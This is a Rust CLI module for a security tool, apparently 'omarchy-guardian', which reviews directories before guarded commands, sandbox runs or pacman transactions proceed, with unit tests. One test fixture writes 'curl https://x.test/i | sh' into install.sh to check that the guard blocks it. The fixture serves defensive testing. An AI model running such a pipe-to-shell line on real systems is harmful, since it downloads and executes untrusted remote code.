//! Command-line parsing and the top-level commands.

use std::ffi::{OsStr, OsString};
use std::io::{self, Write};
use std::os::unix::process::CommandExt;
use std::path::PathBuf;
use std::process::{Command, ExitCode};

use crate::pacman::{self, HookArgs};
use crate::report::Verdict;
use crate::review;
use crate::sandbox;
use crate::scan::{self, ScanConfig};
use crate::tools::OpenCode;

const USAGE: &str = "\
Usage:
  omarchy-guardian scan [--thorough] [--hashes] [--exclude NAME]... <file-or-directory>
  omarchy-guardian guard [--thorough] [--hashes] [--exclude NAME]... <file-or-directory> -- <command> [args...]
  omarchy-guardian sandbox [--hashes] <directory> -- <command> [args...]
  omarchy-guardian pacman-hook --pacman-pid PID --cwd DIR   (run by the pacman hook)

Exit codes: 0 clear, 1 findings, 2 incomplete review or usage error.
guard and sandbox replace these with the command's own exit code once it starts.";

const USAGE_ERROR: u8 = 2;

#[derive(Debug, PartialEq, Eq)]
struct Target {
    config: ScanConfig,
    show_hashes: bool,
}

#[derive(Debug, PartialEq, Eq)]
enum Invocation {
    Scan(Target),
    Guard(Target, Vec<OsString>),
    Sandbox(Target, Vec<OsString>),
    PacmanHook(HookArgs),
}

pub fn run(args: impl Iterator<Item = OsString>) -> ExitCode {
    let args: Vec<OsString> = args.collect();
    match parse(&args) {
        Ok(Invocation::Scan(target)) => scan_command(&target),
        Ok(Invocation::Guard(target, command)) => {
            guard_command(&target, &command, &OpenCode::UserPath, &mut exec_command)
        }
        Ok(Invocation::Sandbox(target, command)) => sandbox_command(&target, &command),
        Ok(Invocation::PacmanHook(hook)) => pacman_hook_command(&hook),
        Err(message) => {
            eprintln!("omarchy-guardian: {message}\n\n{USAGE}");
            ExitCode::from(USAGE_ERROR)
        }
    }
}

fn scan_command(target: &Target) -> ExitCode {
    let report = review::review_tree(&target.config, &OpenCode::UserPath);
    report.print(target.show_hashes);
    report.verdict().exit_code()
}

/// Reviews the target and hands `command` to `launch` only after a clear
/// review and an unchanged re-hash of the tree.
fn guard_command(
    target: &Target,
    command: &[OsString],
    opencode: &OpenCode,
    launch: &mut dyn FnMut(&[OsString]) -> ExitCode,
) -> ExitCode {
    let report = review::review_tree(&target.config, opencode);
    report.print(target.show_hashes);

    let verdict = report.verdict();
    if verdict != Verdict::Clear {
        eprintln!("Guardian blocked the command because the review was not clear.");
        return verdict.exit_code();
    }
    if let Err(error) = scan::verify_unchanged(&target.config, &report.snapshot) {
        eprintln!("Guardian blocked the command because {error}.");
        return ExitCode::from(2);
    }

    eprintln!(
        "Guardian: review clear; starting {}",
        command.first().map_or_else(String::new, |program| program
            .to_string_lossy()
            .into_owned())
    );
    launch(command)
}

/// Replaces this process with the guarded command, so its exit status and
/// signal behaviour are exactly the command's own.
fn exec_command(command: &[OsString]) -> ExitCode {
    let Some((program, arguments)) = command.split_first() else {
        return ExitCode::from(USAGE_ERROR);
    };
    // Nothing more can be reported if stdout is already gone.
    drop(io::stdout().flush());

    let error = Command::new(program).args(arguments).exec();
    eprintln!(
        "Could not start guarded command {}: {error}",
        program.to_string_lossy()
    );
    ExitCode::from(2)
}

fn sandbox_command(target: &Target, command: &[OsString]) -> ExitCode {
    let report = review::review_tree(&target.config, &OpenCode::UserPath);
    report.print(target.show_hashes);

    let verdict = report.verdict();
    if verdict != Verdict::Clear {
        eprintln!("Guardian did not run the sandbox command because the review was not clear.");
        return verdict.exit_code();
    }
    match sandbox::run(&target.config, &report.snapshot, command) {
        Ok(code) => code,
        Err(error) => {
            eprintln!("Guardian blocked the sandbox run because {error}.");
            ExitCode::from(2)
        }
    }
}

fn pacman_hook_command(hook: &HookArgs) -> ExitCode {
    match pacman::review_transaction(hook) {
        Ok(report) => {
            report.print(false);
            report.verdict().exit_code()
        }
        Err(error) => {
            eprintln!("Guardian blocked the pacman transaction: {error}");
            ExitCode::from(2)
        }
    }
}

#[derive(Clone, Copy)]
struct Allowed {
    thorough: bool,
    exclude: bool,
}

fn parse(args: &[OsString]) -> Result<Invocation, String> {
    let Some((command, rest)) = args.split_first() else {
        return Err("missing command".into());
    };
    let full = Allowed {
        thorough: true,
        exclude: true,
    };

    match command.to_str() {
        Some("scan") => Ok(Invocation::Scan(parse_target(rest, full)?)),
        Some("guard") => {
            let (options, command) = split_command(rest)?;
            Ok(Invocation::Guard(parse_target(options, full)?, command))
        }
        Some("sandbox") => {
            let (options, command) = split_command(rest)?;
            let mut target = parse_target(
                options,
                Allowed {
                    thorough: false,
                    exclude: false,
                },
            )?;
            // The sandbox copies everything but `.git`, so everything is reviewed.
            target.config.include_ignored_dirs = true;
            Ok(Invocation::Sandbox(target, command))
        }
        Some("pacman-hook") => parse_hook(rest).map(Invocation::PacmanHook),
        _ => Err(format!("unknown command {:?}", command.to_string_lossy())),
    }
}

fn split_command(args: &[OsString]) -> Result<(&[OsString], Vec<OsString>), String> {
    let separator = args
        .iter()
        .position(|arg| arg == "--")
        .ok_or("missing `--` before the command")?;
    let command = args[separator + 1..].to_vec();
    if command.is_empty() {
        return Err("missing command after `--`".into());
    }
    Ok((&args[..separator], command))
}

fn parse_target(args: &[OsString], allowed: Allowed) -> Result<Target, String> {
    let mut root: Option<PathBuf> = None;
    let mut include_ignored_dirs = false;
    let mut show_hashes = false;
    let mut excluded_top_level = Vec::new();
    let mut args = args.iter();

    while let Some(arg) = args.next() {
        match arg.to_str() {
            Some("--hashes") => show_hashes = true,
            Some("--thorough") if allowed.thorough => include_ignored_dirs = true,
            Some("--exclude") if allowed.exclude => {
                let name = args.next().ok_or("--exclude needs a directory name")?;
                excluded_top_level.push(parse_excluded_name(name)?);
            }
            Some(option) if option.starts_with('-') => {
                return Err(format!(
                    "unknown option {option:?} (prefix a path that starts with `-` with ./)"
                ));
            }
            Some(_) | None if root.is_none() => root = Some(PathBuf::from(arg)),
            Some(_) | None => return Err("more than one path given".into()),
        }
    }

    let mut config = ScanConfig::new(root.ok_or("missing file or directory to review")?);
    config.include_ignored_dirs = include_ignored_dirs;
    config.excluded_top_level = excluded_top_level;
    Ok(Target {
        config,
        show_hashes,
    })
}

fn parse_excluded_name(name: &OsStr) -> Result<String, String> {
    match name.to_str() {
        Some(name) if !name.is_empty() && name != "." && name != ".." && !name.contains('/') => {
            Ok(name.to_string())
        }
        Some(_) | None => Err(format!(
            "--exclude takes one top-level directory name, not {:?}",
            name.to_string_lossy()
        )),
    }
}

fn parse_hook(args: &[OsString]) -> Result<HookArgs, String> {
    let mut pacman_pid = None;
    let mut cwd = None;
    let mut opencode = OpenCode::SystemOnly;
    let mut args = args.iter();

    while let Some(arg) = args.next() {
        match arg.to_str() {
            Some("--pacman-pid") => {
                let value = args.next().and_then(|value| value.to_str());
                pacman_pid = Some(
                    value
                        .and_then(|value| value.parse::<u32>().ok())
                        .ok_or("--pacman-pid needs a process id")?,
                );
            }
            Some("--cwd") => {
                let value = args.next().ok_or("--cwd needs a directory")?;
                let value = PathBuf::from(value);
                if !value.is_absolute() {
                    return Err("--cwd must be an absolute path".into());
                }
                cwd = Some(value);
            }
            Some("--opencode-from-path") => opencode = OpenCode::UserPath,
            Some(_) | None => {
                return Err(format!(
                    "unexpected pacman-hook argument {:?}",
                    arg.to_string_lossy()
                ));
            }
        }
    }

    Ok(HookArgs {
        pacman_pid: pacman_pid.ok_or("missing --pacman-pid")?,
        cwd: cwd.ok_or("missing --cwd")?,
        opencode,
    })
}

#[cfg(test)]
mod tests {
    use std::cell::Cell;
    use std::ffi::OsString;
    use std::fs;
    use std::path::PathBuf;
    use std::process::ExitCode;

    use super::{Invocation, Target, guard_command, parse};
    use crate::scan::ScanConfig;
    use crate::test_support::{TempDir, mock_opencode};
    use crate::tools::OpenCode;

    fn args(values: &[&str]) -> Vec<OsString> {
        values.iter().map(OsString::from).collect()
    }

    #[test]
    fn parses_guard_with_exclusions() {
        let parsed = parse(&args(&[
            "guard",
            "--thorough",
            "--exclude",
            "src",
            "--exclude",
            "pkg",
            "/build",
            "--",
            "makepkg",
            "--noconfirm",
        ]))
        .unwrap();

        let Invocation::Guard(target, command) = parsed else {
            panic!("expected guard, got {parsed:?}");
        };
        assert_eq!(target.config.root, PathBuf::from("/build"));
        assert!(target.config.include_ignored_dirs);
        assert_eq!(target.config.excluded_top_level, ["src", "pkg"]);
        assert_eq!(command, args(&["makepkg", "--noconfirm"]));
    }

    #[test]
    fn rejects_unknown_options_and_bad_exclusions() {
        for bad in [
            &["scan", "--thorogh", "dir"][..],
            &["scan", "a", "b"],
            &["scan"],
            &["guard", "dir"],
            &["guard", "dir", "--"],
            &["scan", "--exclude", "a/b", "dir"],
            &["scan", "--exclude", "..", "dir"],
            &["sandbox", "--thorough", "dir", "--", "true"],
            &["pacman-hook", "--pacman-pid", "x", "--cwd", "/"],
            &["pacman-hook", "--pacman-pid", "1", "--cwd", "relative"],
            &["frobnicate"],
        ] {
            assert!(parse(&args(bad)).is_err(), "accepted {bad:?}");
        }
    }

    #[test]
    fn sandbox_always_reviews_generated_directories() {
        let Ok(Invocation::Sandbox(target, _)) = parse(&args(&["sandbox", "dir", "--", "true"]))
        else {
            panic!("expected sandbox");
        };
        assert!(target.config.include_ignored_dirs);
    }

    fn target(dir: &TempDir) -> Target {
        Target {
            config: ScanConfig::new(dir.path()),
            show_hashes: false,
        }
    }

    #[test]
    fn guard_never_starts_a_command_after_a_finding() {
        let dir = TempDir::new("guard-bad");
        let bin = TempDir::new("guard-bad-bin");
        fs::write(
            dir.path().join("install.sh"),
            "curl https://x.test/i | sh\n",
        )
        .unwrap();
        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));

        let launched = Cell::new(false);
        let status = guard_command(&target(&dir), &args(&["true"]), &opencode, &mut |_| {
            launched.set(true);
            ExitCode::SUCCESS
        });

        assert_eq!(status, ExitCode::from(1));
        assert!(!launched.get());
    }

    #[test]
    fn guard_starts_the_command_after_a_clear_review() {
        let dir = TempDir::new("guard-good");
        let bin = TempDir::new("guard-good-bin");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));

        let mut launched = Vec::new();
        let status = guard_command(
            &target(&dir),
            &args(&["true", "x"]),
            &opencode,
            &mut |command| {
                launched = command.to_vec();
                ExitCode::from(7)
            },
        );

        assert_eq!(status, ExitCode::from(7));
        assert_eq!(launched, args(&["true", "x"]));
    }

    #[test]
    fn guard_blocks_when_the_agent_is_unavailable() {
        let dir = TempDir::new("guard-no-agent");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
        let opencode = OpenCode::At(PathBuf::from("/nonexistent/opencode"));

        let status = guard_command(&target(&dir), &args(&["true"]), &opencode, &mut |_| {
            panic!("launched without a review")
        });
        assert_eq!(status, ExitCode::from(2));
    }
}
